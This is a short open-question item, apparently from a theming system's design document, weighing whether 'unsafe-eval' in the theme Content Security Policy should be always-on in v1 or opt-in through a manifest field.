2. Whether `unsafe-eval` in the theme CSP should be opt-in via a manifest field rather than always-on. v1 recommendation: always-on for v1 (most React/Vue/Svelte builds need it); add `manifest.csp.allow_eval: false` as an opt-out in a later version if theme authors care.
